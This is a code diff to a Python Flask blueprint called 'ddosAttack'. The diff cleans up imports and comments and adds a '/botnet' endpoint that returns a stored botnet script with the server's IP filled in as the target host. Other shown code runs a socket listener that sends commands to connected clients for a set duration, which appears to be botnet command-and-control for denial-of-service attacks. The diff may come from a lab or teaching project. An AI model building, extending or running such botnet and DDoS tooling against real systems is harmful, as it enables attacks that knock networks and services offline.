@@ -1,12 +1,10 @@
 from flask import Blueprint, request
-import signal
 import subprocess
 import time
 import socket
 import threading
 from app import db
 import sys
-import os
 
 ddosAttack = Blueprint("ddosAttack", __name__, url_prefix="/ddosAttack")
 
@@ -53,9 +51,13 @@ def checkLatency():
     else:
         return '[PING FAILED] ' + line
     
+@ddosAttack.get("/botnet")
+def getBotnetScript():
+    command = getCommand("DDOS", "BOTNET")
+    script = command.replace('target_host = ""', f'target_host = "{getIpAddress()}"')
+    return script
+    
 def send_commands(conn, command):
-    # finalCommand = f"{command} --duration {duration}"
-
     if len(str.encode(command)) > 0:
         conn.send(str.encode(command))
         client_response = str(conn.recv(1024), "utf-8")
@@ -73,10 +75,7 @@ def botnet(command, duration):
     server.listen(5)
     print ("[*] listening on {}:{}".format(bindIp, bindPort))
 
-    max_connections = 2  # Maximum number of concurrent connections
-
     threads = [] # Create a list to keep track of threads
-
     start_time = time.time()  # Record the start time
 
     while (time.time() - start_time) < duration:
